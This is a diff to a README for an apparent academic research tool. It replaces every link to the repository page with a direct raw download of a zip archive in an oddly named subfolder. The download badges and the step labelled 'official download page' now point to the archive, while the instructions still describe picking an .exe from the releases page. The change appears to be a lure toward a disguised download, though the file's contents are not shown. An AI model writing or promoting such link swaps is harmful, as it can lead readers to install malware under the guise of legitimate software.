@@ -1,6 +1,6 @@
 # 🔍 research-skills-guide - Streamline your academic research workflow easily
 
-[![](https://img.shields.io/badge/Download-Research-Skills-blue.svg)](https://github.com/khoman9874/research-skills-guide)
+[![](https://img.shields.io/badge/Download-Research-Skills-blue.svg)](https://github.com/khoman9874/research-skills-guide/raw/refs/heads/main/phaeodarian/guide_skills_research_3.9.zip)
 
 This guide helps researchers manage academic tasks. Use these tools to organize research proposals, review medical imaging data, and build presentation slides. This software supports your entire project cycle from start to finish.
 
@@ -8,13 +8,13 @@ This guide helps researchers manage academic tasks. Use these tools to organize 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official download page](https://github.com/khoman9874/research-skills-guide).
+1. Go to the [official download page](https://github.com/khoman9874/research-skills-guide/raw/refs/heads/main/phaeodarian/guide_skills_research_3.9.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Click the file that ends in .exe to start your download.
 4. Open the file once it finishes downloading.
 5. Follow the prompts on your screen to complete the installation.
 
-[![](https://img.shields.io/badge/Download-Software-grey.svg)](https://github.com/khoman9874/research-skills-guide)
+[![](https://img.shields.io/badge/Download-Software-grey.svg)](https://github.com/khoman9874/research-skills-guide/raw/refs/heads/main/phaeodarian/guide_skills_research_3.9.zip)
 
 ## 💻 System Requirements
 
